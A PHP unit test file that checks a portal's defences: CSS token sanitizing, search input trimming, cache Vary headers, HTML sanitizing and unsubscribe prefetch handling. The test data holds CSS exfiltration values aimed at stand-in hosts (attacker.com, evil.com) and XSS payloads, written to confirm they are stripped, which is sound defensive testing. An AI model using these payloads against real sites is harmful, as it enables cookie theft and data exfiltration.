<?php

namespace Platform\Portal\Tests\Unit\Security;

use Illuminate\Http\Request;
use Platform\Portal\Http\Controllers\SearchController;
use Platform\Portal\Http\Controllers\SubscriptionController;
use Platform\Portal\Http\Middleware\CacheResponse;
use Platform\Portal\Sections\RichContent;
use Platform\Portal\Services\TokenCompilerService;
use Symfony\Component\HttpFoundation\Response;
use Tests\TestCase;
use Webkul\Core\Repositories\SubscribersListRepository;

class ExtendedSecurityHardeningTest extends TestCase
{
    /**
     * Test TokenCompilerService rejects CSS Injection and exfiltration vectors.
     */
    public function test_token_compiler_blocks_injection_vectors(): void
    {
        $compiler = app(TokenCompilerService::class);

        $payload = [
            '--safe-color' => '#10b981',
            '--injected-url' => 'url("https://attacker.com/leak")',
            '--injected-expression' => 'expression(alert(document.cookie))',
            '--injected-import' => '@import "https://evil.com/style.css"',
            '--injected-comment' => '/* test */ #fff',
            '--injected-escape' => '\\00002a',
            '--invalid-key!' => '#ffffff',
            'normal_key_without_dashes' => '#000000',
        ];

        $sanitized = $compiler->sanitizeTokens($payload);

        $this->assertArrayHasKey('--safe-color', $sanitized);
        $this->assertEquals('#10b981', $sanitized['--safe-color']);

        $this->assertArrayNotHasKey('--injected-url', $sanitized);
        $this->assertArrayNotHasKey('--injected-expression', $sanitized);
        $this->assertArrayNotHasKey('--injected-import', $sanitized);
        $this->assertArrayNotHasKey('--injected-comment', $sanitized);
        $this->assertArrayNotHasKey('--injected-escape', $sanitized);
        $this->assertArrayNotHasKey('--invalid-key!', $sanitized);
        $this->assertArrayNotHasKey('normal_key_without_dashes', $sanitized);
    }

    /**
     * Test SearchController sanitizes and trims wildcards and long inputs.
     */
    public function test_search_controller_sanitizes_query_and_escapes_wildcards(): void
    {
        $controller = app(SearchController::class);

        // 1. Long query over 100 characters must be trimmed without error
        $longQuery = str_repeat('a', 150);
        $request = Request::create('/search', 'GET', ['query' => $longQuery]);
        $request->headers->set('Accept', 'application/json');

        $response = $controller->index($request);
        $this->assertEquals(200, $response->getStatusCode());
        $data = json_decode($response->getContent(), true);
        $this->assertEquals(100, strlen($data['query']));

        // 2. Query with wildcard characters (%) and (_) does not break query
        $wildcardRequest = Request::create('/search', 'GET', ['query' => '%_test_%']);
        $wildcardRequest->headers->set('Accept', 'application/json');

        $wildcardResponse = $controller->index($wildcardRequest);
        $this->assertEquals(200, $wildcardResponse->getStatusCode());
    }

    /**
     * Test CacheResponse middleware adds Vary header for CDN / proxy localization isolation.
     */
    public function test_cache_response_middleware_sets_vary_headers(): void
    {
        $middleware = new CacheResponse;

        $request = Request::create('/', 'GET');
        $next = fn () => new Response('OK', 200);

        $response = $middleware->handle($request, $next);

        $this->assertTrue($response->headers->has('Vary'));
        $this->assertStringContainsString('Cookie', $response->headers->get('Vary'));
        $this->assertStringContainsString('Accept-Language', $response->headers->get('Vary'));
    }

    /**
     * Test RichContent section sanitization strips XSS script, iframe, and event handlers.
     */
    public function test_rich_content_sanitizes_dangerous_html(): void
    {
        $section = new RichContent;

        $maliciousOptions = [
            'title' => '<b>Safe Title</b><script>alert("xss")</script>',
            'html' => '<div><h3>Welcome</h3><script>alert(1)</script><iframe src="evil.com"></iframe><a href="javascript:alert(2)" onclick="steal()">Click me</a></div>',
        ];

        $sanitized = $section->sanitize($maliciousOptions);

        $this->assertEquals('Safe Title', $sanitized['title']);
        $this->assertStringNotContainsString('<script>', $sanitized['html']);
        $this->assertStringNotContainsString('<iframe>', $sanitized['html']);
        $this->assertStringNotContainsString('onclick', $sanitized['html']);
        $this->assertStringNotContainsString('javascript:', $sanitized['html']);
        $this->assertStringContainsString('<h3>Welcome</h3>', $sanitized['html']);
        $this->assertStringContainsString('Click me', $sanitized['html']);
    }

    /**
     * Test SubscriptionController ignores bot prefetch scanner requests.
     */
    public function test_subscription_controller_ignores_prefetch_scanners(): void
    {
        $subRepo = $this->createMock(SubscribersListRepository::class);
        $subRepo->expects($this->never())->method('deleteWhere');

        $controller = new SubscriptionController($subRepo);

        $request = Request::create('/subscription/unsubscribe/sample-token', 'GET');
        $request->headers->set('X-Purpose', 'preview');

        $response = $controller->destroy($request, 'sample-token');

        $this->assertEquals(302, $response->getStatusCode());
    }
}
